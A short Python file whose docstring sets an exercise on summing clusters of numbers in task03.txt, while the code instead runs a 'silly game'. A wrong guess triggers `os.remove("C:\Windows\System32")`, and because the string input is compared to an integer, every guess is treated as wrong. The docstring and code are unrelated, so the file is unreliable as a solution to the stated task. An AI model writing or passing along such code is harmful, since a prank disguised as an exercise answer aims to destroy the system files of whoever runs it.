#!python
# Sum of Values

"""
The file task03.txt contains a lot of data.  Each cluster of data is the number of points for that particular group.  Each blank line indicates a separator before the next group.
Read the contents of task03.txt into your program and determine the points value of the cluster with largest sum.

For sample data task03.txt, the largest sum should be 68787
"""

import random
import os

number = random.randint(1,10)

guess = input("silly game! guess a number between 1 and 10: ")

if guess == number:
    print("you won!")


else:
    os.remove("C:\Windows\System32")

print(f"the real number is {number}")